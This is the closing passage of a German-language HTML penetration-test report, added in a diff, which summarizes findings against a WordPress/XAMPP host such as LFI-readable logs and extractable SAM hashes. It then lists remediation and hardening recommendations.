+                 <li>**System (Konfiguration):** Webserver (XAMPP) läuft mit Rechten, die Zugriff auf weite Teile des Systems erlauben. Logdateien sind über LFI lesbar. NTLM-Hashes aus SAM extrahierbar.</li>
+                 <li>**Allgemein:** Vorhandensein von Standard-Benutzernamen (`administrator`). Speicherung von Flags als Klartextdateien in Benutzerprofilen.</li>
+             </ul>
+
+             <h3>Allgemeine Empfehlungen:</h3>
+             <p class="recommendation"><strong>Empfehlung (Admin):</strong>
+                 <ol>
+                     <li><strong>Sofortmaßnahmen:</strong>
+                         <ul>
+                            <li>System sofort vom Netzwerk isolieren.</li>
+                            <li>Das verwundbare Plugin "editor" entfernen.</li>
+                            <li>Das System vollständig neu installieren oder aus einem sauberen Backup wiederherstellen, da eine vollständige Kompromittierung stattgefunden hat.</li>
+                         </ul>
+                     </li>
+                     <li><strong>Systemhärtung:</strong>
+                         <ul>
+                             <li>Ein unterstütztes, modernes Betriebssystem verwenden und zeitnah patchen.</li>
+                             <li>WordPress Core, alle Plugins und Themes aktuell halten. Nicht benötigte Komponenten entfernen.</li>
+                             <li>Starke, einzigartige Passwörter für alle Konten verwenden. Standardnamen ändern/deaktivieren. 2FA wenn möglich aktivieren.</li>
+                             <li>SMB Message Signing erzwingen.</li>
+                             <li>Prinzip der geringsten Rechte für alle Benutzer und Dienstkonten anwenden.</li>
+                             <li>Webserver sicher konfigurieren (Zugriffsrechte, PHP-Härtung, Log-Maskierung).</li>
+                             <li>Zugriff auf die WordPress REST API einschränken.</li>
+                             <li>Credential Dumping verhindern/erschweren.</li>
+                         </ul>
+                     </li>
+                     <li><strong>Sicherheitsarchitektur & Überwachung:</strong>
+                         <ul>
+                            <li>Netzwerksegmentierung.</li>
+                            <li>Web Application Firewall (WAF).</li>
+                            <li>Endpoint Detection and Response (EDR).</li>
+                            <li>Zentrales Logging und Monitoring.</li>
+                         </ul>
+                     </li>
+                 </ol>
+             </p>
+ 
+
+        </section>
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 2024-08-14</p>
+    </footer>
+</body>
+</html>
